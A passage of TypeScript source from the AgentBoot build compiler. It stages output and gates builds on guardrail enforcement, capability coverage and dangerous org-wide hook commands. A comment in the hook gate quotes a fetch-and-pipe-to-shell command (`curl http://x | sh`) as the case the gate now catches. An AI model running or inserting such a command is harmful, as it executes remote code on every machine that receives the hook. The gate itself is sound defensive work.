  const configDir = path.dirname(configPath);

  // Point HUB_ROOT at the hub being built so module-level helpers that
  // read core/* and nodes/groups/teams/* resolve against the hub, not the
  // installed agentboot package. This is the companion to the HUB_ROOT
  // declaration at the top of the file.
  HUB_ROOT = configDir;

  const finalDistPath = path.resolve(
    configDir,
    config.output?.distPath ?? "./dist"
  );

  // F-1: this build now DELETES the previous dist/ tree. Refuse to do that to
  // a symlink, to the hub root, or to anything outside the hub.
  assertSafeDistTarget(finalDistPath, configDir);

  // N1: arm the invalidation hook BEFORE any gate below can exit. Every gate
  // from here on is a place the build can stop, and each one must leave dist/
  // marked stale rather than plausibly-current.
  const configDigest = computeConfigDigest(config);
  distInvalidationContext = {
    finalDistPath,
    configDigest,
    outputFormats: config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS],
    version: packageVersion(),
  };

  // Every emitter below writes into a staging sibling; the tree is swapped into
  // place at the very end of main(). This is what makes `dist/` a faithful
  // projection of hub config rather than an append-only cache: an artifact the
  // operator revoked is simply never written this build, and therefore is gone.
  //
  // Binding the staging dir to the name `distPath` is deliberate — it keeps the
  // ~3,800 lines of emitters (62 writeFileSync + 5 copyFileSync call sites)
  // untouched. Threading a path-recorder through all 67 would be a diff where a
  // single missed site silently reintroduces the defect.
  const distPath = `${finalDistPath}.staging-${process.pid}`;
  if (fs.existsSync(distPath)) fs.rmSync(distPath, { recursive: true, force: true });
  stagingDistPath = distPath;

  // Deprecated: staging makes a dirty dist/ structurally impossible, so the
  // guard has nothing left to guard. Removing the key outright would break
  // existing configs for no benefit — accept it, and say it is now a no-op.
  if (config.output?.failOnDirtyDist) {
    log(
      chalk.yellow(
        "  ⚠ output.failOnDirtyDist is deprecated and ignored — dist/ is now rebuilt from empty and pruned on every build.",
      ),
    );
  }

  ensureDir(distPath);

  // Core content is sourced from two locations and merged at compile time:
  //   1. Package bundle (ROOT/core/*) — defaults shipped with AgentBoot
  //   2. Hub directory (HUB_ROOT/core/*) — organization additions and overrides
  // Hub content wins on name conflicts. This lets a hub enable package
  // defaults without copying files locally, while still being able to
  // author hub-specific additions or override a default by name.
  const packageCoreDir = path.join(ROOT, "core");
  const hubCoreDir = path.join(HUB_ROOT, "core");

  // coreDir / coreLexiconDir / coreTraitsDir remain pointing at the hub
  // for backward compatibility with downstream code that expects a single
  // directory (gotchas, scope nodes). The package-merge logic below
  // augments the hub content where it matters (traits, personas,
  // instructions, lexicon).
  const coreDir = hubCoreDir;
  const coreLexiconDir = path.join(coreDir, "lexicon");
  const corePersonasDir = path.join(coreDir, "personas");
  const coreTraitsDir = path.join(coreDir, "traits");
  const coreInstructionsDir = path.join(coreDir, "instructions");

  // Package-side equivalents used for the merge.
  const packageLexiconDir = path.join(packageCoreDir, "lexicon");
  const packagePersonasDir = path.join(packageCoreDir, "personas");
  const packageTraitsDir = path.join(packageCoreDir, "traits");
  const packageInstructionsDir = path.join(packageCoreDir, "instructions");

  const validFormats = [...VALID_OUTPUT_FORMATS];
  const outputFormats = config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS];
  // Every valid output format MUST have an enforcement classification. Without
  // this assertion the two lists drift silently, and a format present in one but
  // not the other is precisely how the capability gate failed open on `plugin`.
  const unclassified = validFormats.filter((f) => !(f in PLATFORM_ENFORCEMENT));
  if (unclassified.length > 0) {
    log(chalk.red(`  ✗ Output format(s) with no enforcement classification: ${unclassified.join(", ")}`));
    log(chalk.gray(`    Add a row to PLATFORM_ENFORCEMENT in scripts/lib/conformance.ts.`));
    log(chalk.gray(`    An unclassified format cannot be gated, so guardrails targeting it would pass unchecked.`));
    process.exit(1);
  }
  // The symmetric assertion for the capability table. Without it a typo
  // ("cluade") silently shrinks an emittedBy set to zero, and the gate then
  // errors on EVERY build for a capability that is in fact emitted — a false
  // positive that would get the whole gate disabled. Same drift class as
  // `plugin`, opposite direction, four lines to make impossible.
  const badCapabilityRefs = CAPABILITY_SUPPORT.flatMap((r) => [
    ...r.emittedBy.filter((f) => !validFormats.includes(f)).map((f) => `${r.id} → "${f}"`),
    // B1: the same drift check for the conditional half. A `conditionalOn` key
    // that is not in `emittedBy` is dead configuration (it can never filter
    // anything); a dependency naming a non-format can never be satisfied, so the
    // row would be permanently unhonoured with no explanation.
    ...Object.keys(r.conditionalOn ?? {})
      .filter((k) => !r.emittedBy.includes(k))
      .map((k) => `${r.id} → conditionalOn["${k}"] but "${k}" is not in emittedBy`),
    ...Object.values(r.conditionalOn ?? {}).flat()
      .filter((f) => !validFormats.includes(f))
      .map((f) => `${r.id} → conditionalOn depends on unknown format "${f}"`),
  ]);
  if (badCapabilityRefs.length > 0) {
    log(chalk.red(`  ✗ CAPABILITY_SUPPORT references unknown output format(s):`));
    for (const b of badCapabilityRefs) log(chalk.red(`      ${b}`));
    log(chalk.gray(`    Fix the row in scripts/lib/conformance.ts — an unknown name makes the row unsatisfiable.`));
    process.exit(1);
  }

  // B5: the third table gets the same assertion as the other two.
  //
  // PLATFORM_ENFORCEMENT and CAPABILITY_SUPPORT are both checked above for
  // `validFormats ⊆ keys(...)`; APPLY_TO_PROJECTION was not, and it is the one
  // whose gate FAILS CLOSED on an unknown format (degradedFormats treats a
  // missing row as "unsupported"). So a format added to validFormats without a
  // projection row would not fail loudly — it would make every scoped
  // instruction targeting that format an error, on every build, with a message
  // blaming the artifact rather than the missing row. That is how a gate gets
  // switched off.
  const unprojected = validFormats.filter((f) => !(f in APPLY_TO_PROJECTION));
  if (unprojected.length > 0) {
    log(chalk.red(`  ✗ Output format(s) with no applyTo-projection classification: ${unprojected.join(", ")}`));
    log(chalk.gray(`    Add a row to APPLY_TO_PROJECTION in scripts/lib/scope-projection.ts.`));
    log(chalk.gray(`    degradedFormats() fails closed on an unknown format, so the missing row would`));
    log(chalk.gray(`    surface as a scope error on every artifact instead of as this message.`));
    process.exit(1);
  }

  const unknownFormats = outputFormats.filter((f) => !validFormats.includes(f));
  if (unknownFormats.length > 0) {
    console.error(chalk.red(`Unknown output format(s): ${unknownFormats.join(", ")}. Valid: ${validFormats.join(", ")}`));
    process.exit(1);
  }

  // H1 (F-3): a format whose emitters are gated on another format that is not
  // being built produces a tree that is empty in the ways that matter, and says
  // "✓ Compiled 4 persona(s) × 1 platform(s)" about it.
  //
  // Verified against the pre-fix tree: outputFormats ["plugin"] exited 0 with
  // dist/plugin/ containing `core` and no hooks at all.
  //
  // Erroring rather than silently implying the dependency is deliberate. Adding
  // `claude` to the build changes what lands in every spoke targeting claude;
  // that is the operator's decision to make, and a build that quietly widens its
  // own output is a worse surprise than one that stops and says why.
  const missingRequires = outputFormats.flatMap((f) =>
    (PLATFORM_REQUIRES[f] ?? [])
      .filter((dep) => !outputFormats.includes(dep))
      .map((dep) => ({ format: f, dep })));
  if (missingRequires.length > 0) {
    for (const { format, dep } of missingRequires) {
      console.error(chalk.red(
        `✗ Output format \`${format}\` requires \`${dep}\`, which is not in personas.outputFormats.`,
      ));
      console.error(chalk.gray(
        `    dist/${format}/ is assembled from dist/${dep}/, so without it the tree is produced`,
      ));
      console.error(chalk.gray(
        `    but carries none of the hooks or compiled personas — a green build over an empty control.`,
      ));
      console.error(chalk.gray(
        `    Fix: add "${dep}" to personas.outputFormats, or remove "${format}".`,
      ));
    }
    process.exit(1);
  }

  // AB-88: Resolve N-tier scope tree
  // B13 fix: warn if both groups and nodes defined
  if (config.groups && config.nodes) {
    log(chalk.yellow("  ⚠ Both 'groups' and 'nodes' defined — 'nodes' takes precedence. Remove 'groups' to suppress this warning."));
  }
  const scopeNodes = config.nodes
    ? config.nodes
    : config.groups
      ? groupsToNodes(config.groups)
      : undefined;

  // Load lexicon from both package and hub, hub entries appended last so
  // they take precedence at usage time where duplicates occur.
  const lexiconEntries = [
    ...loadLexicon(packageLexiconDir),
    ...loadLexicon(coreLexiconDir),
  ];
  if (lexiconEntries.length > 0) {
    log(chalk.cyan(`Lexicon loaded: ${lexiconEntries.length} term(s)`));
    for (const entry of lexiconEntries) {
      log(chalk.gray(`  + ${entry.term}`));
    }
  }

  // Load traits from both package and hub. Map.set on the same key lets
  // the hub override a package trait of the same name.
  const enabledTraits = config.traits?.enabled;
  const traits = loadTraits(packageTraitsDir, enabledTraits);
  const hubTraits = loadTraits(coreTraitsDir, enabledTraits);
  for (const [name, trait] of hubTraits) {
    if (traits.has(name)) {
      log(chalk.gray(`  ~ hub overrides package trait: ${name}`));
    }
    traits.set(name, trait);
  }

  log(chalk.cyan(`Traits loaded: ${traits.size}`));
  for (const name of traits.keys()) {
    log(chalk.gray(`  + ${name}`));
  }
  log(chalk.cyan(`Output formats: ${outputFormats.join(", ")}`));
  log("");

  const enabledPersonas = config.personas?.enabled;

  // Discover persona directories. Package first, then hub, then customDir.
  // Later sources override earlier ones on name conflict (hub overrides
  // package; customDir overrides both).
  const personaDirs = new Map<string, string>();

  if (fs.existsSync(packagePersonasDir)) {
    for (const entry of fs.readdirSync(packagePersonasDir)) {
      const dir = path.join(packagePersonasDir, entry);
      if (fs.statSync(dir).isDirectory()) {
        personaDirs.set(entry, dir);
      }
    }
  }

  if (fs.existsSync(corePersonasDir)) {
    for (const entry of fs.readdirSync(corePersonasDir)) {
      const dir = path.join(corePersonasDir, entry);
      if (fs.statSync(dir).isDirectory()) {
        if (personaDirs.has(entry)) {
          log(chalk.yellow(`  ⚠ Hub persona overrides package: ${entry}`));
        }
        personaDirs.set(entry, dir);
      }
    }
  }

  if (config.personas?.customDir) {
    const extendDir = path.resolve(configDir, config.personas.customDir);
    if (fs.existsSync(extendDir)) {
      for (const entry of fs.readdirSync(extendDir)) {
        const dir = path.join(extendDir, entry);
        if (fs.statSync(dir).isDirectory()) {
          if (personaDirs.has(entry)) {
            log(chalk.yellow(`  ⚠ Extension persona overrides core: ${entry}`));
          }
          personaDirs.set(entry, dir);
        }
      }
    } else {
      log(chalk.yellow(`  ⚠ Extension path not found: ${extendDir}`));
    }
  }

  const allResults: CompileResult[] = [];

  // The append-without-clear guard that used to live here (two targeted
  // unlinkSync calls for the JetBrains/Windsurf concat files) is gone: the
  // staging dir starts empty, so nothing can be appended to a previous build's
  // file. That also fixes what the old loop never covered — it iterated
  // ["core"] only, so non-core scopes kept accumulating duplicate appends.

  // ---------------------------------------------------------------------------
  // 1. Compile core personas → dist/{platform}/core/{persona}/
  // ---------------------------------------------------------------------------

  log(chalk.cyan("Compiling core personas..."));

  for (const [personaName, personaDir] of personaDirs) {
    if (enabledPersonas && !enabledPersonas.includes(personaName)) {
      log(chalk.gray(`  - ${personaName} (disabled)`));
      continue;
    }

    const result = compilePersona(
      personaName,
      personaDir,
      traits,
      config,
      distPath,
      "core"              // scopePath → dist/{platform}/core/{persona}/
    );

    allResults.push(result);

    const traitsNote =
      result.traitsInjected.length > 0
        ? chalk.gray(` [traits: ${result.traitsInjected.join(", ")}]`)
        : chalk.gray(" [no traits]");
    log(`  ${chalk.green("✓")} ${personaName}${traitsNote}`);
  }

  // Compile always-on instructions from both package and hub. Package
  // defaults are written first; hub-level instructions are written
  // second so any same-named hub file overwrites the package copy.
  // F-6: one accumulator across every compileInstructions pass. Keyed
  // `<scope>/<name>` with last-write-wins, so the hub copy legitimately
  // overwrites the package copy rather than double-reporting.
  const scopeSeen = new Map<string, ScopedArtifact>();
  compileInstructions(
    packageInstructionsDir,
    config.instructions?.enabled,
    distPath,
    "core",
    config,
    outputFormats,
    scopeSeen,
  );
  compileInstructions(
    coreInstructionsDir,
    config.instructions?.enabled,
    distPath,
    "core",
    config,
    outputFormats,
    scopeSeen,
  );

  // AB-52: Compile gotchas (path-scoped knowledge rules)
  const coreGotchasDir = path.join(coreDir, "gotchas");
  compileGotchas(coreGotchasDir, distPath, "core", config, outputFormats);

  // Collect instruction file names (shared by Claude and AGENTS.md output)
  const instrFileNames: string[] = [];
  if (fs.existsSync(coreInstructionsDir)) {
    const instrFiles = fs.readdirSync(coreInstructionsDir).filter((f) => f.endsWith(".md"));
    for (const file of instrFiles) {
      const name = path.basename(file, ".md");
      if (!config.instructions?.enabled || config.instructions.enabled.includes(name)) {
        instrFileNames.push(name);
      }
    }
  }

  // AB-19/26/27: Claude-specific output (CLAUDE.md, settings.json, .mcp.json)
  if (outputFormats.includes("claude")) {
    // Collect persona configs for welcome fragment (AB-77)
    const personaConfigs = new Map<string, PersonaConfig>();
    for (const [personaName, personaDir] of personaDirs) {
      if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
      const pc = loadPersonaConfig(personaDir);
      if (pc) personaConfigs.set(personaName, pc);
    }

    generateClaudeMd(
      [...traits.keys()],
      traits,
      instrFileNames,
      config,
      distPath,
      "core",
      personaConfigs,
      lexiconEntries
    );

    generateSettingsJson(config, distPath, "core");
    generateMcpJson(config, distPath, "core");

    // AB-111: Generate managed-settings.d/ scope fragments
    // Alphabetical naming for scope precedence: 00-org wins over 10-group wins over 20-team
    if (config.managed || config.claude?.permissions || config.claude?.hooks || config.claude?.settings) {
      const managedDir = path.join(distPath, "claude", "core", "managed-settings.d");
      ensureDir(managedDir);
      const fragment: Record<string, unknown> = {};
      // Arbitrary-key pass-through first, so the dedicated keys below win on collision
      // (validation already rejects collisions; this is defense in depth).
      if (config.claude?.settings) Object.assign(fragment, config.claude.settings);
      if (config.claude?.permissions) fragment["permissions"] = config.claude.permissions;
      if (config.claude?.hooks) fragment["hooks"] = config.claude.hooks;
      if (config.managed) {
        if (config.managed.guardrails?.disableBypassPermissions) {
          fragment["disableBypassPermissionsMode"] = "disable";
        }
      }
      if (Object.keys(fragment).length > 0) {
        fs.writeFileSync(
          path.join(managedDir, "00-org.json"),
          JSON.stringify(fragment, null, 2) + "\n",
          "utf-8"
        );
      }
    }

    // Story 12: Write /ab agents to dist/claude/core/agents/ (sub-agents Claude spawns)
    // and a user-invocable SKILL.md to dist/claude/core/skills/ab/ (what /ab resolves to).
    // The five agent files go to agents/ as-is. The ab.md content is also emitted as
    // a skill-format SKILL.md with context:fork + agent:ab frontmatter so that typing
    // /ab in Claude Code resolves correctly — Claude Code looks in skills/, not agents/.
    const skillsTemplateDir = path.join(ROOT, "templates", "skills");
    const distAgentsDir = path.join(distPath, "claude", "core", "agents");
    ensureDir(distAgentsDir);
    // Phase 11 B1.5: Model-aware delegation + tool restrictions
    const defaultModels: Record<string, string> = {
      "ab": "sonnet",
      "ab-query": "haiku",
      "ab-author": "sonnet",
      "ab-diagnose": "sonnet",
      "ab-manage": "sonnet",
    };
    const defaultDisallowedTools: Record<string, string[]> = {
      "ab-query": ["Bash", "Write", "Edit", "NotebookEdit"],
    };
    const abSkillFiles = ["ab.md", "ab-author.md", "ab-diagnose.md", "ab-manage.md", "ab-query.md"];
    for (const file of abSkillFiles) {
      const src = path.join(skillsTemplateDir, file);
      const dest = path.join(distAgentsDir, file);
      if (fs.existsSync(src)) {
        let content = fs.readFileSync(src, "utf-8");
        const fileName = path.basename(file, ".md");
        const override = config.ab?.modelOverrides?.[fileName];
        let model = defaultModels[fileName];
        if (override !== undefined) {
          if (isValidAbModel(override)) {
            model = override;
          } else {
            log(
              chalk.yellow(
                `  ⚠ Ignoring invalid ab.modelOverrides["${fileName}"] = "${override}" — ` +
                  `expected opus | sonnet | haiku | inherit or a claude-* model id; ` +
                  `using default "${defaultModels[fileName]}".`,
              ),
            );
          }
        }
        const disallowed = defaultDisallowedTools[fileName];

        // Inject model: and disallowedTools: into frontmatter if it has one
        if (content.startsWith("---\n")) {
          const fmEnd = content.indexOf("\n---\n", 4);
          if (fmEnd !== -1) {
            let frontmatter = content.slice(4, fmEnd);
            const body = content.slice(fmEnd + 5);
            if (model && !frontmatter.includes("model:")) {
              frontmatter += `\nmodel: ${model}`;
            }
            if (disallowed && !frontmatter.includes("disallowedTools:")) {
              frontmatter += `\ndisallowedTools: [${disallowed.map(t => `"${t}"`).join(", ")}]`;
            }
            content = `---\n${frontmatter}\n---\n${body}`;
          }
        }
        fs.writeFileSync(dest, content, "utf-8");
      }
    }

    // Write skills/ab/SKILL.md — the user entry point for /ab.
    // No context:fork — /ab is an interactive orchestrator, not a one-shot skill.
    // context:fork collapses output to "command completed" at the end, swallowing
    // all specialist output. Running inline keeps output in the conversation.
    const abSrc = path.join(skillsTemplateDir, "ab.md");
    if (fs.existsSync(abSrc)) {
      const abContent = fs.readFileSync(abSrc, "utf-8");
      // Strip the agent-format frontmatter block and replace with skill-format
      const bodyStart = abContent.indexOf("\n---\n", 4) + 5; // skip opening ---\n...---\n
      const body = bodyStart > 4 ? abContent.slice(bodyStart) : abContent;
      const skillContent = [
        "---",
        `description: "AgentBoot orchestrator — routes persona, trait, gotcha, and hub management requests to the right specialist"`,
        `agent: "ab"`,
        "---",
        "",
        body.trimStart(),
      ].join("\n");
      const distSkillDir = path.join(distPath, "claude", "core", "skills", "ab");
      ensureDir(distSkillDir);
      fs.writeFileSync(path.join(distSkillDir, "SKILL.md"), skillContent, "utf-8");
    }
    log(chalk.gray(`  → /ab agents written to dist/claude/core/agents/, skill entry at dist/claude/core/skills/ab/SKILL.md`));
  }

  // AB-144: Gemini-specific output (GEMINI.md with persona index)
  if (outputFormats.includes("gemini")) {
    const personaConfigs = new Map<string, PersonaConfig>();
    for (const [personaName, personaDir] of personaDirs) {
      if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
      const pc = loadPersonaConfig(personaDir);
      if (pc) personaConfigs.set(personaName, pc);
    }
    generateGeminiMd(
      [...traits.keys()],
      traits,
      instrFileNames,
      config,
      distPath,
      "core",
      personaConfigs,
      lexiconEntries
    );
  }

  // AGENTS.md — universal cross-tool output (always generated if format enabled)
  if (outputFormats.includes("agents")) {
    log(chalk.cyan("\nGenerating AGENTS.md..."));
    const personaConfigs = new Map<string, PersonaConfig>();
    for (const [personaName, personaDir] of personaDirs) {
      if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
      const pc = loadPersonaConfig(personaDir);
      if (pc) personaConfigs.set(personaName, pc);
    }
    generateAgentsMd(config, distPath, personaConfigs, instrFileNames, lexiconEntries,
      coreInstructionsDir, packageInstructionsDir, traits, coreGotchasDir);
    log(chalk.green("  AGENTS.md generated"));

    // Phase 11 A1.7-3: Broaden agents platform — emit .agents/skills/ alongside AGENTS.md
    generateCrossToolSkills(distPath, "core", "agents");
    log(chalk.green("  .agents/skills/ generated (cross-tool)"));
  }

  // A1.5: build the portable compliance hook scripts ONCE. Every platform emitter
  // (Claude Code, Codex, Copilot) writes its own copy from this single source, so
  // Codex/Copilot no longer depend on the Claude Code emitter having run first.
  const complianceHookScripts = buildComplianceHookScripts(config);

  // Phase 11 A1.7: Codex platform output
  if (outputFormats.includes("codex")) {
    log(chalk.cyan("\nGenerating Codex output..."));
    // AGENTS.md for Codex — reuse agents output if available, otherwise generate directly
    const codexCoreDir = path.join(distPath, "codex", "core");
    ensureDir(codexCoreDir);
    const agentsSrc = path.join(distPath, "agents", "AGENTS.md");
    if (fs.existsSync(agentsSrc)) {
      fs.copyFileSync(agentsSrc, path.join(codexCoreDir, "AGENTS.md"));
    } else {
      // agents platform not enabled — generate AGENTS.md directly for codex
      const codexPersonaConfigs = new Map<string, PersonaConfig>();
      for (const [personaName, personaDir] of personaDirs) {
        if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
        const pc = loadPersonaConfig(personaDir);
        if (pc) codexPersonaConfigs.set(personaName, pc);
      }
      generateAgentsMd(config, distPath, codexPersonaConfigs, instrFileNames, lexiconEntries,
        coreInstructionsDir, packageInstructionsDir, traits, coreGotchasDir, undefined, "codex");
    }
    // .codex/config.toml — already generated by generateCrossPlatformMcpConfigs
    // .codex/hooks.json — compliance hooks in Codex format
    generateCodexHooks(config, distPath, "core", complianceHookScripts);
    // .agents/skills/ — cross-tool skills
    generateCrossToolSkills(distPath, "core", "codex");
    log(chalk.green("  → dist/codex/"));
  }

  // A1.5: GitHub Copilot governance hooks — .github/hooks/agentboot.json + scripts.
  if (outputFormats.includes("copilot")) {
    generateCopilotHooks(config, distPath, "core", complianceHookScripts);
    log(chalk.green("  → dist/copilot/.github/hooks/"));
  }

  // Phase 11 C1.4 + capability gate (2026-08-08): write HARD guardrail artifacts to
  // dist/managed/, AND refuse to emit them to targets that cannot enforce anything.
  //
  // A directive the target cannot enforce, silently omitted, is a compliance hole
  // with a green build and a signed manifest. That is the worst failure mode a
  // governance product has, so it is an error rather than a warning. The escape
  // hatch is per-artifact `advisory-on-unenforceable: acknowledged`.
  // See docs/research/defect-hard-guardrail-silent-downgrade.md
  {
    const managedOutDir = path.join(distPath, "managed");
    const hardArtifacts: { name: string; acknowledged: boolean }[] = [];

    const instrDirs = [coreInstructionsDir, packageInstructionsDir];
    for (const dir of instrDirs) {
      if (!fs.existsSync(dir)) continue;
      for (const file of fs.readdirSync(dir).filter(f => f.endsWith(".md"))) {
        const content = fs.readFileSync(path.join(dir, file), "utf-8");
        const r = inspectArtifact(content);
        if (!r.hard) continue;
        ensureDir(path.join(managedOutDir, "instructions"));
        fs.writeFileSync(path.join(managedOutDir, "instructions", file), content, "utf-8");
        hardArtifacts.push({ name: file.replace(/\.md$/, ""), acknowledged: r.acknowledgedAdvisory });
      }
    }

    for (const [name, trait] of traits) {
      const r = inspectArtifact(trait.raw);
      if (!r.hard) continue;
      ensureDir(path.join(managedOutDir, "traits"));
      fs.writeFileSync(path.join(managedOutDir, "traits", `${name}.md`), trait.raw, "utf-8");
      hardArtifacts.push({ name, acknowledged: r.acknowledgedAdvisory });
    }

    if (hardArtifacts.length > 0) {
      log(chalk.gray(`  → ${hardArtifacts.length} HARD guardrail artifact(s) written to dist/managed/`));

      const advisory = unenforceableFormats(outputFormats);
      if (advisory.length > 0) {
        const unacked = hardArtifacts.filter(a => !a.acknowledged);
        const acked = hardArtifacts.filter(a => a.acknowledged);

        if (acked.length > 0) {
          log(chalk.yellow(
            `  ⚠ ${acked.length} HARD artifact(s) are advisory-only on ${advisory.join(", ")} ` +
            `— acknowledged by the author, delivered as instructions.`
          ));
        }

        if (unacked.length > 0) {
          log("");
          log(chalk.red(`  ✗ HARD guardrails cannot be enforced on: ${advisory.join(", ")}`));
          for (const a of unacked) log(chalk.red(`      ${a.name}`));
          log(chalk.gray(
            `    These targets have no enforcement mechanism, so the artifact would ship as ` +
            `ordinary advisory prose — indistinguishable from a soft preference, behind a signed manifest.`
          ));
          log(chalk.gray(
            `    Fix by removing the unenforceable target from personas.outputFormats, or — if advisory ` +
            `delivery is genuinely intended — add to the artifact's frontmatter:`
          ));
          log(chalk.gray(`      advisory-on-unenforceable: acknowledged`));
          log(chalk.red(
            `  ✗ Build failed: ${unacked.length} HARD guardrail artifact(s) target platforms that ` +
            `cannot enforce them (${advisory.join(", ")}).`
          ));
          log("");
          // Expected validation failure, not a crash — matches the exit convention
          // used by every other fatal check in this file.
          process.exit(1);
        }
      }
    }
  }

  // Dangerous-hook gate: an org-authored `claude.hooks` command is a shell
  // command this compiler is about to write into a managed-settings file that
  // executes on every developer machine in the org, non-overridably. The pattern
  // check for it existed — in `validate`, which neither `build` nor `sync` calls.
  // Verified before this gate: `curl http://x | sh` compiled into
  // dist/claude/core/managed-settings.d/00-org.json and synced to a spoke, both
  // commands exit 0. A check the pipeline never reaches is not a check.
  //
  // Placed with the other gates, before scope-node compilation, so a doomed
  // build stops early. No exception hatch: unlike a capability gap, there is no
  // legitimate reading of "ship this anyway" — the author can always move the
  // logic into a reviewed script the hook invokes by path.
  {
    const findings = dangerousHookFindings(config.claude?.hooks);
    if (findings.length > 0) {
      log("");
      log(chalk.red(`  ✗ Dangerous shell pattern(s) in org-authored claude.hooks:`));
      log("");
      for (const f of findings) {
        log(chalk.red(`      claude.hooks.${f.event} — ${f.why}`));
        log(chalk.gray(`        ${f.command}`));
      }
      log("");
      log(chalk.gray(`    This command is compiled into managed-settings and runs on every developer`));
      log(chalk.gray(`    machine in the org, at every matching event, non-overridably.`));
      log(chalk.gray(`    Fix: move the logic into a reviewed script and invoke it by path from the hook.`));
      log("");
      log(chalk.red(`  ✗ Build failed: ${findings.length} dangerous hook command pattern(s).`));
      log("");
      process.exit(1);
    }
  }

  // Capability gate (2026-08-08): configured capabilities that NO configured
  // output format can honour.
  //
  // Placed here deliberately: after all core emission, so dist/ reflects reality
  // when the message is printed; adjacent to the HARD-guardrail gate above, so
  // the two are read and maintained together; and before scope-node compilation,
  // so a doomed build stops early.
  //
  // The failure this closes: `compile` decided emission with eleven independent
  // `outputFormats.includes(...)` string tests scattered across 3,000 lines, each
  // individually defensible, with an EMPTY `else` everywhere. A capability whose
  // gate was false produced no file, no log line, and no record that it had ever
  // been requested — eight of them passed `build`, `validate --strict` AND
  // `doctor` with zero mention.
  {
    // Both planes, because deriving a governance trigger from config alone is
    // exactly what shipped the HARD-guardrail hole. One implementation of "is
    // this scope narrowing", shared with doctor — a second copy here is
    // precisely the drift that produced this defect class.
    const capCtx: CapabilityContext = {
      config,
      narrowlyScopedInstructions: countNarrowlyScopedInstructions(
        [packageInstructionsDir, coreInstructionsDir],
        config.instructions?.enabled,
      ),
      scopedGotchas: countScopedGotchas(coreGotchasDir),
    };

    // `.active` and never the raw list — that is what makes expiry real. A
    // malformed exceptions file WARNS and is treated as empty (fail closed: the
    // gate still fires), rather than crashing the build or silently passing.
    let activeExceptions: PolicyException[] = [];
    try {
      const exPath = path.join(configDir, HUB_EXCEPTIONS_FILE);
      const loaded = loadExceptionsFile(exPath);
      if (loaded.length > 0) activeExceptions = validateExceptions(loaded).active;
    } catch (err: unknown) {
      log(chalk.yellow(
        `  ⚠ ${HUB_EXCEPTIONS_FILE} is unreadable (${err instanceof Error ? err.message : String(err)}) — no capability waivers honoured.`,
      ));
    }

    const violations = capabilityViolations(capCtx, outputFormats, activeExceptions);
    const waived = violations.filter((v) => v.waivedBy);
    const errors = violations.filter((v) => !v.waivedBy && v.row.severity === "error");
    const warns = violations.filter((v) => !v.waivedBy && v.row.severity === "warn");

    const emittedByLabel = (fmts: string[]) =>
      fmts.length === 0 ? "NOTHING — not implemented on any platform" : fmts.join(", ");

    // Warnings print whether or not the error path fires — a warning must never
    // be swallowed by an error elsewhere.
    if (warns.length > 0) {
      log(chalk.yellow(`  ⚠ Configured capabilities no configured output format can honour (advisory):`));
      for (const v of warns) {
        log(chalk.yellow(`      ${v.row.id.padEnd(44)} emitted by: ${emittedByLabel(effectiveEmitters(v.row, outputFormats))}`));
        log(chalk.gray(`        ${v.row.consequence}`));
      }
    }

    // A waived row prints at ⚠ regardless of its declared severity, and always
    // names owner and expiry. A silent waiver is the same defect wearing a badge.
    if (waived.length > 0) {
      log(chalk.yellow(`  ⚠ ${waived.length} capability gap(s) accepted under an active exception:`));
      for (const v of waived) {
        log(chalk.yellow(
          `      ${v.row.id} — ${v.waivedBy!.id} (owner: ${v.waivedBy!.owner}, expires ${v.waivedBy!.expires})`,
        ));
      }
    }

    if (errors.length > 0) {
      log("");
      log(chalk.red(`  ✗ Configured capabilities that NO configured output format can honour:`));
      log("");
      for (const v of errors) {
        log(chalk.red(`      ${v.row.id.padEnd(44)} emitted by: ${emittedByLabel(effectiveEmitters(v.row, outputFormats))}`));
        log(chalk.gray(`        ${v.row.consequence}`));
      }
      log("");
      log(chalk.gray(`    Configured output formats: ${outputFormats.join(", ")}`));
      log("");
      log(chalk.gray(`    Resolve by one of:`));
      log(chalk.gray(`      • add a platform that emits the capability to personas.outputFormats`));
      log(chalk.gray(`      • remove the capability from agentboot.config.json`));
      log(chalk.gray(`      • record the accepted gap in ${HUB_EXCEPTIONS_FILE} (owned, and expiring):`));
      log(chalk.gray(`          { "id": "EX-2026-014", "policy": "capability:${errors[0]!.row.id}",`));
      log(chalk.gray(`            "reason": "…", "approver": "…", "owner": "…",`));
      log(chalk.gray(`            "created": "YYYY-MM-DD", "expires": "YYYY-MM-DD" }`));
      log("");
      log(chalk.red(
        `  ✗ Build failed: ${errors.length} configured capability/capabilities cannot be honoured by any ` +
        `configured output format (${outputFormats.join(", ")}).`,
      ));
      log("");
      process.exit(1);
    }
    // Silence path: when every configured capability has at least one configured
    // target, print NOTHING. A "✓ all capabilities honoured" line on every build
    // trains operators to skim past exactly the region that matters. `build` is a
    // pipeline step; `doctor` is the report, and it says the positive there.
  }

  // Generate composition manifests for core scope (all platforms)
  for (const fmt of outputFormats) {
    if (fmt === "agents" || fmt === "plugin" || fmt === "windsurf") continue; // No scope merging for these
    generateCompositionManifest(distPath, fmt, "core", config);
  }

  // ---------------------------------------------------------------------------
  // 2. Compile scope nodes (AB-88: N-tier replaces flat groups/teams)
  //    Also provides backward compat with legacy groups/teams config.
  // ---------------------------------------------------------------------------

  if (scopeNodes) {
    log(chalk.cyan("\nCompiling scope nodes..."));
    const flatNodes = flattenNodes(scopeNodes);
    let nodePersonasFound = false;

    for (const { path: nodePath } of flatNodes) {
      // UI-7: one resolver for every documented scope layout (see resolveNodePersonasDir)
      const parts = nodePath.split("/");
      const personasDir = resolveNodePersonasDir(HUB_ROOT, nodePath);

      // UI-8: loud diagnostic — scope-level CONTENT files (traits/instructions/
      // gotchas) are not compiled at node scope in this version; scope overrides
      // are node persona definitions + per-persona trait weights. Without this
      // warning such files validate clean and silently produce no output.
      for (const root of listNodeScopeRoots(HUB_ROOT, nodePath)) {
        for (const category of ["traits", "instructions", "gotchas"] as const) {
          const catDir = path.join(root, category);
          if (!fs.existsSync(catDir)) continue;
          const mdFiles = fs.readdirSync(catDir).filter((f) => f.endsWith(".md") && f !== "README.md");
          if (mdFiles.length > 0) {
            log(chalk.yellow(
              `  ⚠ [${nodePath}] ${mdFiles.length} ${category} file(s) at ${path.relative(HUB_ROOT, catDir)} — ` +
              `scope-level ${category} CONTENT is not compiled (only node personas and per-persona trait weights are). ` +
              `These files currently produce NO output.`
            ));
          }
        }
      }

